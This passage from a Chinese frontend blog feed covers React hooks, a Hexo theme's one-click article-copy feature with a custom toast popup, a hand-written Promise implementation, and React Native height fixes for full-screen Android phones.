      &lt;button onClick=&#123;()=&gt;setUsername(username + &#39;o&#39;)&#125;&gt;改变用户名&lt;/button&gt;
    &lt;/&gt;
  )
&#125;

export default Child = (props = &#123;&#125;) =&gt; &#123;
  console.log(&#39;--- component re-render ---&#39;);  //组件不会重新渲染
  const &#123;username&#125; = props;
  return useMemo(() =&gt; &#123;
    console.log(&#39;--- useMemo re-render ---&#39;);  //函数重新渲染
    return (
      &lt;div&gt;&#123;username&#125;&lt;/div&gt;
    )
  &#125;, [username]);
&#125;</code></pre>
<h3 id="useCallback"><a href="#useCallback" class="headerlink" title="useCallback"></a>useCallback</h3><p><code>useCallback</code> 与 <code>useMemo</code> 类似，也接受两个参数：回调函数 和 依赖项数组，返回缓存 <code>memoized</code> 值。当依赖性数组中的某个值发生变化时，传入的回调函数被新的闭包函数取代。</p>
<p>说白了就是，<code>useMemo</code> 中的函数直接运行，<code>useCallback</code> 返回的函数需要你手动跑。类比于 <code>call</code> 和 <code>bind</code>。</p>
<pre><code class="javascript">import React, &#123; useState, useCallback &#125; from &#39;react&#39;;

export default Father = (props = &#123;&#125;) =&gt; &#123;
  const [username, setUsername] = useState(&#39;zhaoo&#39;);
  const handleClick = useCallback(() =&gt; &#123;
    setUsername(username + &#39;o&#39;);
  &#125;);
  return (
    &lt;&gt;
      &lt;Child username=&#123;username&#125; /&gt;
      &lt;button onClick=&#123;handleClick&#125;&gt;改变用户名&lt;/button&gt;
    &lt;/&gt;
  )
&#125;

export default Child = (props = &#123;&#125;) =&gt; &#123;
  const &#123;username&#125; = props;
  return (
    &lt;div&gt;&#123;username&#125;&lt;/div&gt;
  )
&#125;</code></pre>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>上文只是对这些 API 过了一遍，还是乱讲的那种。不过产生了一些体会，只可意会不可言传。</p>
<p>从 <strong>生命周期</strong> 到 <strong>Hooks</strong>，从 <strong>对象式组件</strong> 到 <strong>函数式组件</strong>，从 <strong>命令式</strong> 到 <strong>声明式</strong>，应该是思想上转变，以及为什么要引入 <code>Hooks</code>。</p>
<p>而不是讨论 <code>useEffect</code> 中传什么参数可以模拟 <code>componentDidMount</code> 还是 <code>componentWillUnmount</code> 还是 <code>componentWillUpdate</code>。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 开发文章搬运功能</title>
    <url>/2020/07/25/hexo-article-carrier/</url>
    <content><![CDATA[<p>我们不生产文章，我们只是文章的搬运工。</p>
<span id="more"></span>

<p>最近发现一个蛮有意思的现象：在掘金刷到了一篇写挺好的文章，看完顺手三连。然后过了几天，就能在各种渠道看到这篇文章，公众号、技术博客、朋友圈……最后发现，掘金那篇也不是原创，而是搬运来的。且原文明明标注了“BY-NC-SA”版权协议，大家转载的时候都不注明。</p>
<blockquote>
<p>甲：我们不生产文章，我们只是文章的搬运工。<br>乙：这篇文章写的很不错嘛，下一秒就是我的了。<br>丙：读书人的事，怎么能叫偷。<br>……</p>
</blockquote>
<p>有意思，那我就在主题写个小功能吧，帮助大家一键搬运。<del>（没有人会搬运我的水文）</del></p>
<p>效果是酱紫滴：</p>
<p><img  src="https://pic.izhaoo.com/20200727125134.jpg"  ><span class="image-caption">版权声明</span></p>
<p>（正常开启版权声明）</p>
<p><img  src="https://pic.izhaoo.com/20200727125519.jpg"  ><span class="image-caption">放弃抵抗</span></p>
<p><img  src="https://pic.izhaoo.com/20200727125724.jpg"  ><span class="image-caption">弹窗提示</span></p>
<p>(放弃抵抗，大家随意)</p>
<p>点击【一键打包带走】后，将全文（MarkDown、HTML、文本）复制到剪切板，并且弹窗提示。</p>
<h3 id="内容获取"><a href="#内容获取" class="headerlink" title="内容获取"></a>内容获取</h3><h5 id="2020-09-06"><a href="#2020-09-06" class="headerlink" title="2020.09.06"></a>2020.09.06</h5><p>今日去 <code>hexo</code> 文档转了一圈，发现居然更新了（昨天更新的），新增了一些实用 <code>API</code>，相见恨晚啊！其中就有 <code>page.raw</code> 用来获取文章原始内容，也就是 <code>MarkDown</code> ，这样就不需要之前这么折腾了，so easy~</p>
<p>直接贴代码（这部分是辅助函数 <code>Helper</code>）：</p>
<pre><code class="javascript">&#39;use strict&#39;;

module.exports.carrier = function (hexo) &#123;
  hexo.extend.helper.register(&#39;carrier&#39;, function () &#123;
    var config = hexo.theme.config;
    if (!config.carrier || !config.carrier.enable || !config.carrier.type) &#123;
      return;
    &#125;
    var data;
    switch (config.carrier.type) &#123;
      case &#39;html&#39;:
        data = this.page.content;
        break;
      case &#39;markdown&#39;:
        data = this.page.raw;
        break;
      case &#39;text&#39;:
        data = this.strip_html(this.page.content);
        break;
      default:
        data = &#39;没有抓到内容哦~&#39;;
    &#125;
    return data;
  &#125;);
&#125;</code></pre>
<h5 id="2020-07-22"><a href="#2020-07-22" class="headerlink" title="2020.07.22"></a>2020.07.22</h5><p>已废弃……</p>
<p>这部分挺难整的，主要是获取 <code>MarkDown</code> 原始内容比较难， <code>hexo</code> 渲染生成 <code>html</code> 之后是不会在生成文件中保留 <code>md</code> 源文件的。所以得想办法在  <code>hexo</code> 渲染的时候把 <code>md</code> 内容抓出来，翻了半天 <code>hexo</code> 官方文档，也没什么完美的思路。（吐槽一下，文档是真的简略。）</p>
<p>最后在生命周期中找到这个函数：<code>hexo.extend.processor.register(rule, function(file)&#123; var data = file.readSync(); &#125;);</code></p>
<p>主要是在渲染前，载入 <code>md</code> 文件的时候做一个监听，获取原始内容（也就是 MarkDown）。</p>
<p>这里就有一个问题了，我们需要判断 <code>Front-Matter</code> 中的 <code>carrier</code> 字段是否为 <code>true</code> 来决定是否开启功能。但是使用 <code>processor</code> 劫持原始数据的时候，内容还未被渲染，所以拿不到该字段。另外就是拿到原始数据后，如何进行持久化保存？给出如下方案：</p>
<ol>
<li>不管三七二十一，劫持所有文章，全部保存为文件。后续通过运行时的生命周期获取 <code>carrier</code> 字段并判断是否启用。 （×）</li>
<li>在原始文件中通过正则表达式手动解析 <code>carrier</code> 字段。选择性的保存文件，甚至直接插入 <code>DOM</code> 节点。 （√）</li>
</ol>
<p>最后选择了方案二，正则就比较头疼了……（作者正则水平不太好）</p>
<p>需要解析的原文片段如下，需要解析出 <code>carrier</code> 字段。</p>
<pre><code class="yml">---
title: hexo - 开发文章搬运功能
date: 2020-07-25 17:14:33
tags: [Hexo, 主题]
keywords: hexo-theme-zhaoo, zhaoo, hexo, 主题, 文章搬运， 一键复制
categories:
- 项目
image: https://pic.izhaoo.com/20200718151502.jpg
carrier: true
---

文本内容……</code></pre>
<p>网上搜到的正则是这样的，还需要做个改动：<code>^(---(?:\r?\n(?!--|\s*$).*)*)\s*((?:\r?\n(?!---).*)*\r?\n---)$</code> </p>
<p>（不会正则就很难受了，书到用时方恨少~）</p>
<h3 id="复制逻辑"><a href="#复制逻辑" class="headerlink" title="复制逻辑"></a>复制逻辑</h3><p>前面在 <code>hexo</code> 生命周期中（carrier()）获取到了文章内容，下面要完成用户点击链接后，复制到剪切板的交互逻辑。但是 <code>help</code> 函数只能在模板引擎渲染的时候使用，无法同 <code>js</code> 文件进行同步。（类别于 php函数 与 js）</p>
<p>用个 <code>hack</code> 方法：在模板中创建一个隐藏的 <code>input</code> ，模板渲染的时候调用 <code>carrier()</code> 函数将文章内容加载到 <code>input</code> 中，然后在 <code>js</code> 中通过与 <code>input</code> 进行交互间接获取了内容。</p>
<pre><code class="html">&lt;% if (theme.carrier.enable &amp;&amp; page.carrier) &#123; %&gt;
  &lt;li&gt;&lt;strong&gt;版权声明：&lt;/strong&gt;本文作者放弃了版权，大家随意搬运，特此奉上搬运链接：&lt;a href=&quot;javascript:;&quot; class=&quot;j-carrier-btn&quot;&gt;一键打包带走&lt;/a&gt;&lt;/li&gt;
  &lt;input type=&quot;hidden&quot; value=&quot;&lt;%= carrier(); %&gt;&quot; class=&quot;j-carrier-data carrier-data&quot;&gt;
&lt;% &#125; %&gt;</code></pre>
<p>接下来完成复制到剪切板功能。很简单，通过 <code>select</code> 选择 <code>input</code> 框，再通过 <code>document.execCommand(&quot;Copy&quot;)</code> 方法拷贝到剪切板。有个小问题，隐藏的 <code>input</code> 无法被 <code>select</code>，我们就让它变成小透明，假装隐藏了。比较常用的就是 <code>opacity: 0;</code> 设置透明，但是仍会占据文档流，顺便给个 <code>left: -100px</code> 拖出去。</p>
<pre><code class="stylus">.carrier-data
  opacity 0
  position fixed
  left -100px</code></pre>
<pre><code class="javascript">carrier: function () &#123;
  $(&quot;.j-carrier-btn&quot;).on(&quot;click&quot;, function () &#123;
    $(&quot;.j-carrier-data&quot;).select();
    document.execCommand(&quot;Copy&quot;);
    alert(&#39;已经复制到剪切板&#39;);
  &#125;);
&#125;</code></pre>
<h3 id="消息弹窗"><a href="#消息弹窗" class="headerlink" title="消息弹窗"></a>消息弹窗</h3><p>文章复制到剪切板后，需要弹出消息弹窗，提示用户。</p>
<p>主题开发之初我就给自己规定，不到万不得已，绝不用第三方库。（jQuery实在是没办法了）所以我们就自己封装一个消息弹窗组件。</p>
<p>第一版代码：</p>
<p>逻辑很清晰。触发弹窗后，先构造 <code>DOM</code> 并插入到 <code>body</code> （根），添加 <code>in</code> 样式（渐入动画）。若干秒后移除 <code>in</code> 样式（渐出动画），并删除 <code>DOM</code>。</p>
<pre><code class="javascript">Message: function (&#123; text, type, timer &#125;) &#123;
  var message = &#39;&lt;div class=&quot;zui-message &#39; + (type || &quot;info&quot;) + &#39;&quot;&gt;&lt;p&gt;&#39; + text + &#39;&lt;/p&gt;&lt;/div&gt;&#39;;
  $(&quot;body&quot;).append(message);
  var e = $(&quot;.zui-message&quot;);
  e.addClass(&quot;in&quot;);
  setTimeout(function () &#123;
    e.removeClass(&quot;in&quot;);
    $(this).remove();
  &#125;, timer || 3000);
&#125;</code></pre>
<pre><code class="javascript">Message(&#123; text: &#39;已复制到剪切板&#39;, type: &#39;success&#39; &#125;);</code></pre>
<pre><code class="stylus">$color-info = #909399
$color-success = #67c23a
$color-danger = #f56c6c
$color-warning = #e6a23c
$color-info-bgc = #edf2fc
$color-success-bgc = #f0f9eb
$color-danger-bgc = #fef0f0
$color-warning-bgc = #fdf6ec
.zui-message
  position fixed
  margin 0
  padding 10px 20px
  top -50px
  left 50%
  min-width 250px
  overflow hidden
  z-index 2020
  display flex
  justify-content center
  align-items center
  transform translateX(-50%)
  transition top 0.4s
  background-color $color-info-bgc
  p
    margin 0
    color $color-info
  for $type in info success danger warning  //遍历四种类型
    &amp;.&#123;$type&#125;
      background-color convert(&#39;$color-&#39; + $type + &#39;-bgc&#39;)  //拼接变量名，引入颜色
      p
        color convert(&#39;$color-&#39; + $type)
  &amp;.in
    top 50px  //渐入动画</code></pre>
<p>跑一便，似乎不太对，点击后弹窗直接显示，三秒后弹窗直接消失，没有出现动画效果。</p>
<p>分析一下原因：由于动态插入 <code>DOM</code> 后直接添加了样式（绘制未完成），此时浏览器还未计算出 <code>CSS</code> 属性就直接给绑定了 <code>transition</code>，导致直接渲染了最终效果，给个异步延迟可以解决。关闭很好理解，没等渐出效果生效就直接删除 <code>DOM</code> 了。</p>
<p>第二版代码：</p>
<pre><code class="javascript">Message: function (&#123; text, type, timer &#125;) &#123;
  var message = &#39;&lt;div class=&quot;zui-message &#39; + (type || &quot;info&quot;) + &#39;&quot;&gt;&lt;p&gt;&#39; + text + &#39;&lt;/p&gt;&lt;/div&gt;&#39;;
  $(&quot;body&quot;).append(message);
  var e = $(&quot;.zui-message&quot;);
  setTimeout(function () &#123;
    e.addClass(&quot;in&quot;);
  &#125;, 0);
  setTimeout(function () &#123;
    e.removeClass(&quot;in&quot;);
    setTimeout(function () &#123;
      $(this).remove();
    &#125;, 0);
  &#125;, timer || 3000);
&#125;</code></pre>
<p>一堆 <code>setTimeout(fn, 0)</code> 太丑了，绑定事件代替之。</p>
<p>第三版代码：</p>
<pre><code class="javascript">Message: function (&#123; text, type, timer &#125;) &#123;
  var message = &#39;&lt;div class=&quot;zui-message &#39; + (type || &quot;info&quot;) + &#39;&quot;&gt;&lt;p&gt;&#39; + text + &#39;&lt;/p&gt;&lt;/div&gt;&#39;;
  $(&quot;body&quot;).append(message);
  var e = $(&quot;.zui-message&quot;);
  e.ready(function () &#123;
    e.addClass(&quot;in&quot;);
    setTimeout(function () &#123;
      e.removeClass(&quot;in&quot;);
      e.on(&quot;transitionend webkitTransitionEnd&quot;, function () &#123;
        $(this).remove();
      &#125;);
    &#125;, timer || 3000);
  &#125;);
&#125;</code></pre>
<p>动画效果是出来了，但是感觉好卡，一帧一帧的。</p>
<p>犯了个低级错误：用定位来做动画，浏览器主线程会不停地<strong>回流</strong>，改变元素位置，然后再计算下一个渲染位置。优化一下，使用 <code>transform</code> 代替，浏览器只会计算动画初始位置和结束位置，不会频繁触发<strong>回流</strong>。</p>
<pre><code class="stylus">.zui-message
  top 0px
  left 50%
  opacity 0  //顺便加个淡入
  transform translate(-50%, -50px)
  transition opacity 0.3s, transform 0.4s, top 0.4s
  &amp;.in
    transform translate(-50%, 50px)
    opacity 1</code></pre>
<p>最后套个<strong>节流</strong>函数：</p>
<pre><code class="javascript">carrier: function () &#123;
  $(&quot;.j-carrier-btn&quot;).on(&quot;click&quot;, utils.throttle(function () &#123;  //节流
    $(&quot;.j-carrier-data&quot;).select();
    document.execCommand(&quot;Copy&quot;);
    zui.Message(&#123; text: &#39;已复制到剪切板&#39;, type: &#39;success&#39; &#125;);
  &#125;, 3000));
&#125;</code></pre>
]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>主题</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - Promise</title>
    <url>/2020/07/17/js-promise/</url>
    <content><![CDATA[<p>承诺我已说出口。</p>
<span id="more"></span>

<h3 id="面试环节"><a href="#面试环节" class="headerlink" title="面试环节"></a>面试环节</h3><p>先来看一段代码：</p>
<pre><code class="javascript">new Promise((resolve, reject) =&gt; &#123;
  console.log(&quot;外部promise&quot;);
  resolve();
&#125;)
  .then(() =&gt; &#123;
    console.log(&quot;外部第一个then&quot;);
    new Promise((resolve, reject) =&gt; &#123;
      console.log(&quot;内部promise&quot;);
      resolve();
    &#125;)
      .then(() =&gt; &#123;
        console.log(&quot;内部第一个then&quot;);
      &#125;)
      .then(() =&gt; &#123;
        console.log(&quot;内部第二个then&quot;);
      &#125;);
    return new Promise((resolve, reject) =&gt; &#123;
      console.log(&quot;内部promise2&quot;);
      resolve();
    &#125;)
      .then(() =&gt; &#123;
        console.log(&quot;内部第一个then2&quot;);
      &#125;)
      .then(() =&gt; &#123;
        console.log(&quot;内部第二个then2&quot;);
      &#125;);
  &#125;)
  .then(() =&gt; &#123;
    console.log(&quot;外部第二个then&quot;);
  &#125;);</code></pre>
<p>Are you ok ? 恭喜你被谷歌录取了 : 行了行了下一位</p>
<h3 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h3><p>首先我们先来了解一下引入 <code>Promise</code> 的必要性。</p>
<h5 id="回调地狱"><a href="#回调地狱" class="headerlink" title="回调地狱"></a>回调地狱</h5><p>曾几何时<del>（现在也是）</del>，我们的异步代码是这样的：</p>
<pre><code class="javascript">post(&#39;/user/login&#39;, function (err, data) &#123;
  if (err) return err;
  get(&#39;/user/info&#39;, function (err, data) &#123;
    if (err) return err;
    post(&#39;/articles/create&#39;, function (err, data) &#123;
      if (err) return err;
      get(&#39;/articles/list&#39;, function (err, data) &#123;
        ...
      &#125;);
    &#125;);
  &#125;);
&#125;);</code></pre>
<p>这就是大家津津乐道的 <strong>回调地狱</strong> 了，主要有以下几个问题：</p>
<ol>
<li>嵌套太深，逻辑复杂：每层的回调函数的业务逻辑都依赖于上层执行的返回结果，嵌套层次多了之后，代码可读性很差。</li>
<li>错误处理麻烦：每层的回调函数都需要传入两个状态（失败、成功），且每一层都需要对错误进行单独处理，没有统一的错误处理机制。</li>
<li>上下文环境乱：有的时候我们想处理上层环境（调用 <code>this</code>），却发现绑定不到，只能使用 <code>var _this = this;</code> 这样的 hack 方法。</li>
</ol>
<h5 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h5><p>这时候天空一声巨响，<code>Promise</code> 闪亮登场，救人民与水深火热之中。代码如下：</p>
<pre><code class="javascript">//用 Promise 封装接口
const post = (url) =&gt; &#123;
  return new Promise((resolve, reject) =&gt; &#123;
    post(url, (err, data) =&gt; &#123;
      err &amp;&amp; reject(err)
      resolve(data)
    &#125;)
  &#125;)
&#125;

//调用逻辑
post(&#39;/user/login&#39;)
  .then(data =&gt; get(&#39;/user/info&#39;))
  .then(data =&gt; post(&#39;/articles/create&#39;))
  .then(data =&gt; get(&#39;/articles/list&#39;))
  .then(...)
  .catch(err =&gt; console.error(&#39;报错了啦：&#39; + err))</code></pre>
<p>这不是好起来了嘛：</p>
<ol>
<li>干掉了嵌套调用，采用了链式挂载，逻辑上清晰了一些。</li>
<li>合并处理错误，在最后统一 <code>catch</code> 并执行。</li>
</ol>
<h5 id="async-await"><a href="#async-await" class="headerlink" title="async / await"></a>async / await</h5><p>Emmm，还不是一坨代码。好吧，再来看看终极方案 <code>async/await</code>：</p>
<pre><code class="javascript">const do = async () =&gt; &#123;
  try &#123;
    const token = await post(&#39;/user/login&#39;);
    const userInfo = await get(&#39;/user/info&#39;);
    const createArticleResult = await post(&#39;/articles/create&#39;);
    const articlesList = await get(&#39;/articles/list&#39;);
    ...
  &#125; catch (err) &#123;
    console.error(&#39;又报错了啦：&#39; + err)
  &#125;
&#125;</code></pre>
<p>直接屏蔽了异步逻辑，改用同步方式。</p>
<p><img  src="https://pic.izhaoo.com/wa.png"  ><span class="image-caption">wo</span></p>
<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><blockquote>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise">Promise - MDN</a></p>
</blockquote>
<p>工欲善其事，必先利其器。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>那么 <code>Promise</code> 是如何工作的呢？主要是采用了 <strong>延迟绑定</strong> 和 <strong>返值穿透</strong> 两种思想。</p>
<h5 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h5><pre><code class="javascript">const p = new Promise((resolve, reject) =&gt; &#123; resolve(&#39;ok&#39;) &#125;)

...

p.then((value) =&gt; &#123; console.log(value) &#125;)</code></pre>
<p>可以看到先创建了应该 <code>Promise</code> 对象，此时还没有绑定 <code>回调函数</code>。创建完对象之后，可以处理其他代码逻辑。直到调用 <code>then</code> 处理执行逻辑的时候，我们才将 <code>回调函数</code> 进行绑定。<strong>创建对象</strong> 和 <strong>绑定回调</strong> 实现了分离解耦。</p>
<h5 id="返值穿透"><a href="#返值穿透" class="headerlink" title="返值穿透"></a>返值穿透</h5><pre><code class="javascript">const p1 = new Promise((resolve, reject) =&gt; &#123;
  resolve(1)
&#125;)

const p2 = p1.then((value) =&gt; &#123;
  const p2 = new Promise((resolve, reject) =&gt; &#123;
    resolve(value + 1)
  &#125;)
  return p2
&#125;)

p2.then((value) =&gt; &#123;
  console.log(value)
&#125;)</code></pre>
<p>可以看到，在 <code>p1</code> 的回调函数中我们创建了一个新的 <code>Promise</code> 对象 <code>p2</code>，将它 <code>return</code> 到了最外层并被接受。每层回调函数的返回值始终可以穿透到最外层，这样就可以保证 <code>返回值</code> 始终可控，不会陷入循环中。</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><img  src="https://pic.izhaoo.com/show-me-your-code.gif"  ><span class="image-caption">上代码啊</span></p>
<p>其实经典方法的实现原理都大同小异：状态流传递、队列缓存回调……</p>
<pre><code class="javascript">const PENDING = &#39;PENDING&#39;
const FULFILLED = &#39;FULFILLED&#39;
const REJECTED = &#39;REJECTED&#39;

class MyPromise &#123;
  constructor(handle) &#123;
    this._status = PENDING
    this._value = undefined
    //回调函数队列
    this._fulfilledQueues = []
    this._rejectedQueues = []
    //执行handle
    try &#123;
      handle(this._resolve.bind(this), this._reject.bind(this))
    &#125; catch (err) &#123;
      this._reject(err)
    &#125;
  &#125;

  // resovle时执行的函数
  _resolve(val) &#123;
    if (this._status !== PENDING) return
    this._status = FULFILLED
    this._value = val
  &#125;

  // reject时执行的函数
  _reject(err) &#123;
    if (this._status !== PENDING) return
    this._status = REJECTED
    this._value = err
  &#125;

  // then方法
  then(onFulfilled, onRejected) &#123;
    const &#123; _value, _status &#125; = this
    return new MyPromise((onFulfilledNext, onRejectedNext) =&gt; &#123;
      //成功时执行的函数
      let fulfilled = value =&gt; &#123;
        try &#123;
          let res = onFulfilled(value);
          if (res instanceof MyPromise) &#123;
            // 如果当前回调函数返回Promise对象，必须等待其状态改变后在执行下一个回调
            res.then(onFulfilledNext, onRejectedNext)
          &#125; else &#123;
            //否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数
            onFulfilledNext(res)
          &#125;
        &#125; catch (err) &#123;
          onRejectedNext(err)
        &#125;
      &#125;
      //失败时执行的函数
      let rejected = error =&gt; &#123;
        try &#123;
          let res = onRejected(error);
          if (res instanceof MyPromise) &#123;
            // 如果当前回调函数返回Promise对象，必须等待其状态改变后在执行下一个回调
            res.then(onFulfilledNext, onRejectedNext)
          &#125; else &#123;
            //否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数
            onFulfilledNext(res)
          &#125;
        &#125; catch (err) &#123;
          onRejectedNext(err)
        &#125;
      &#125;
      switch (_status) &#123;
        //状态为pending时将回调函数推入队列进行缓存
        case PENDING:
          this._fulfilledQueues.push(fulfilled)
          this._rejectedQueues.push(rejected)
          break
        //状态改变时执行回调函数
        case FULFILLED:
          fulfilled(_value)
          break
        case REJECTED:
          rejected(_value)
          break
      &#125;
    &#125;)
  &#125;
&#125;</code></pre>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><blockquote>
<p><a href="https://juejin.im/post/5dcb775c518825574d214b89">大厂面试必考知识点：Promise 注册微任务和执行过程</a></p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>RN - 适配安卓全面屏</title>
    <url>/2020/06/25/rn-adapt-to-full-screen/</url>
    <content><![CDATA[<p><code>ReactNative</code> 中对安卓全面屏手机的进行适配，去除底边。</p>
<span id="more"></span>

<p>最近对 <code>RN</code> 项目打了包，在安卓端进行真机调试，各种水土不服。主要就是在全面屏下高度不匹配，底边会多出一段白边。下面简单解释一下原因，并给出解决方案：</p>
<h3 id="高度获取"><a href="#高度获取" class="headerlink" title="高度获取"></a>高度获取</h3><p>在 <code>RN</code> 中，我们一般通过以下代码获取设备高度，并将其设置为视口高度。</p>
<pre><code class="javascript">import &#123;Dimensions&#125; from &#39;react-native&#39;;

export default class Example extends Component &#123;
  render() &#123;
    return (
      &lt;View style=&#123;styles.container&#125;&gt;
        ...
      &lt;/View&gt;
    );
  &#125;
&#125;

const styles = StyleSheet.create(&#123;
  container: &#123;
    backgroundColor: &#39;#f0f3f6&#39;,
    height: Dimensions.get(&#39;window&#39;).height,    //将设备高度设置为视口高度，少一截
  &#125;,
&#125;);</code></pre>
<p>在一般情况下这是设置是没有问题的，整个 <code>视口高度</code> 会以 <code>设备高度</code> 为准撑满整个屏幕。但是在 <strong>全面屏</strong> 或者使用 <strong>Navbar</strong> 的时候就会出问题了，需要进行适配。</p>
<h3 id="全面屏"><a href="#全面屏" class="headerlink" title="全面屏"></a>全面屏</h3><h5 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h5><p>市场上大多数的全面屏安卓手机，一般都是以 <em>刘海屏</em> 、 <em>水滴屏</em> 、 <em>挖孔屏</em> 等异形屏的形式存在。以 <em>小米10（挖孔屏）</em> 为例，屏幕在显示 UI 界面的时候，顶上的挖孔部分一般都是作为 <strong>状态栏</strong> 的形式存在。</p>
<p><code>Dimensions.get(&#39;window&#39;).height</code> 在计算高度的时候不会将他计算进去。但是在实际渲染界面的时候，这部分又会被作为可视区域计算进去。这就造成了 <code>Dimensions.get(&#39;window&#39;).height</code> 获取的 <strong>设备高度</strong> 比 <strong>设备实际高度</strong> 少了一截（状态栏），就会在底部就会以白条的形式进行补全，太丑了……</p>
<p><img  src="https://pic.izhaoo.com/20200625224801266.jpg"  ><span class="image-caption">白边</span></p>
<h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><p>所以我们只要在 <code>Dimensions.get(&#39;window&#39;).height</code> 获取高度的时候，把状态栏的高度也给加上去，作为视口高度就可以了。获取状态栏高度的方法：<code>StatusBar.currentHeight</code>。</p>
<p>改写上面栗子：</p>
<pre><code class="javascript">import &#123;Dimensions, StatusBar&#125; from &#39;react-native&#39;;

export default class Example extends Component &#123;
  render() &#123;
    return (
      &lt;View style=&#123;styles.container&#125;&gt;
        ...
      &lt;/View&gt;
    );
  &#125;
&#125;

const styles = StyleSheet.create(&#123;
  container: &#123;
    backgroundColor: &#39;#f0f3f6&#39;,
    height: Dimensions.get(&#39;window&#39;).height + StatusBar.currentHeight,    //补上状态栏高度，刚刚好
  &#125;,
&#125;);</code></pre>
<p>那么如何保证不误伤 <strong>正常屏</strong> 呢？这里给出龙鸣方法：通过判断 <strong>纵横比</strong>。一般比值大于<code>1.8</code>的是全面屏，小于<code>1.8</code>的是正常屏，代码如下：</p>
<pre><code class="javascript">import &#123;Dimensions, StatusBar&#125; from &#39;react-native&#39;;
const &#123;width, height&#125; = Dimensions.get(&#39;window&#39;);
const wh = height / width;
const height = wh &gt; 1.8 ? height + StatusBar.currentHeight : height;</code></pre>
<p><img  src="https://pic.izhaoo.com/20200625224747636.jpg"  ><span class="image-caption">完美</span></p>
<h3 id="底部导航栏"><a href="#底部导航栏" class="headerlink" title="底部导航栏"></a>底部导航栏</h3><h5 id="原因-1"><a href="#原因-1" class="headerlink" title="原因"></a>原因</h5><p>我们一般会在主屏使用 <code>Navigation</code> 等 <strong>底部导航栏</strong>，这个导航栏也是有高度的，并且在 <code>Dimensions.get(&#39;window&#39;).height</code> 获取高度的时候导航栏的高度也会被计算进去。这就造成了一个问题：导航栏会遮挡页面上的组件。</p>
<h5 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h5><p>所以我们只要把导航栏的高度减去即可：<code>Dimensions.get(&#39;window&#39;).height - 49</code></p>
<p>这边的 <code>49</code> 是我使用的导航栏的高度，一般导航栏高度都是固定的，我们只需要测量一下直接减去数值即可。</p>
<h3 id="简单封装"><a href="#简单封装" class="headerlink" title="简单封装"></a>简单封装</h3><p>若是每个页面都为了计算高度而写一堆花里胡哨的逻辑代码，也太扯淡了。还是需要简单封装一下，如下：</p>
<pre><code class="javascript">//height.js

import &#123;Dimensions, StatusBar&#125; from &#39;react-native&#39;;
const &#123;width, height&#125; = Dimensions.get(&#39;window&#39;);
const wh = height / width;
const realHeight = wh &gt; 1.8 ? height + StatusBar.currentHeight + 46 : height;    //不带导航栏的真实高度
const windowHeight = wh &gt; 1.8 ? height + StatusBar.currentHeight : height - 49;    //减去导航栏的视口高度
export &#123;realHeight, windowHeight&#125;;</code></pre>
<pre><code class="javascript">//page with tabbar

import &#123;windowHeight&#125; from &#39;height&#39;;

export default class Example extends Component &#123;
  render() &#123;
    return (
      &lt;View style=&#123;styles.container&#125;&gt;
        ...
      &lt;/View&gt;
    );
  &#125;
&#125;

const styles = StyleSheet.create(&#123;
  container: &#123;
    height: windowHeight
  &#125;,
&#125;);</code></pre>
<pre><code class="javascript">//page without tabbar

import &#123;realHeight&#125; from &#39;height&#39;;

export default class Example extends Component &#123;
  render() &#123;
    return (
      &lt;View style=&#123;styles.container&#125;&gt;
        ...
      &lt;/View&gt;
    );
  &#125;
&#125;

const styles = StyleSheet.create(&#123;
  container: &#123;
    height: realHeight
  &#125;,
&#125;);</code></pre>
<p>最后吐槽一下！</p>
<p>把前置摄像头砍了！完完全全的全面屏！它不香么？！</p>
<p>后置摄像头那么多有什么用？！一颗大底高素质镜头足矣！</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>React - 生命周期</title>
    <url>/2020/05/17/react-lifecycle/</url>
    <content><![CDATA[<p>对 React 中 <code>生命周期</code> 的一些理解。</p>
<span id="more"></span>

<h1 id="v16-0-前的生命周期"><a href="#v16-0-前的生命周期" class="headerlink" title="v16.0 前的生命周期"></a>v16.0 前的生命周期</h1><p><strong>组件挂载：</strong> componentWillMount -&gt; render -&gt; componentDidMount</p>
<p><strong>组件更新（state 变化）：</strong> shoudlComponentUpdate -&gt; componentWillUpdate -&gt; render -&gt; componentDidUpdate</p>
<p><strong>组件更新（props 变化）：</strong> componentWillReceiveProps -&gt; shouldComponentUpdate -&gt; componentWillUpdate -&gt; render -&gt; componentDidUpdate</p>
<p><strong>组件销毁：</strong> componentWillUnmount</p>
<h3 id="Initialization-初始化阶段"><a href="#Initialization-初始化阶段" class="headerlink" title="Initialization (初始化阶段)"></a>Initialization (初始化阶段)</h3><h5 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h5><p><strong>触发时机：</strong></p>
<p>子组件实例化时。</p>
<p><strong>解析：</strong></p>
